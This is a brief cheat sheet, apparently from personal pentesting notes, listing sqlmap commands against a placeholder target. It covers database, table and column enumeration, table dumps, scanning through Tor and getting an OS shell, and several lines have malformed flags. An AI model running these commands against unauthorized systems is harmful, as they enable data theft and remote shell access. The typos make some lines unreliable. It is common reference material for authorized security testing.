# Sqlmap
#SQLi  #Tool #exploitation 

Automation of the SQLi process. 


## Usage
### Simple usage
 sqlmap -u “http://targetserver/”

### Specify target DBMS to MySQL
 sqlmap -u “http://targetserver/” --dbms=mysql

### Using a proxy
 sqlmap -u “http://targetserver/” --proxy=http://proxy\_address:port

### Specify param1 to exploit
 sqlmap -u “http://targetserver/param1=value1&param2=value2” -p param1

### Use POST requests
 sqlmap -u “http://targetserver” --data=param1=value1&param2=value2

### Access with authenticated session
 sqlmap -u “http://targetserver” --data=param1=value1&param2=value2 -p param1 cookie=’my\_cookie\_value’

### Basic authentication
 sqlmap -u “http://targetserver” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password

### Evaluating response strings
 sqlmap -u “http://targetserver/” --string=”This string if query is TRUE”
 
 sqlmap -u “http://targetserver/” --not-string=”This string if query is FALSE”

### List databases
 sqlmap -u “http://targetserver/” --dbs

### List tables of database target\_DB
 sqlmap -u “http://targetserver/” -D target\_DB --tables

### Dump table target\_Table of database target\_DB
 sqlmap -u “http://targetserver/” -D target\_DB -T target\_Table -dump

### List columns of table target\_Table of database target\_DB
 sqlmap -u “http://targetserver/” -D target\_DB -T target\_Table --columns

### Scan through TOR
 sqlmap -u “http://targetserver/” --tor --tor-type=SOCKS5

### Get OS Shell
 sqlmap -u “http://targetserver/” --os-shell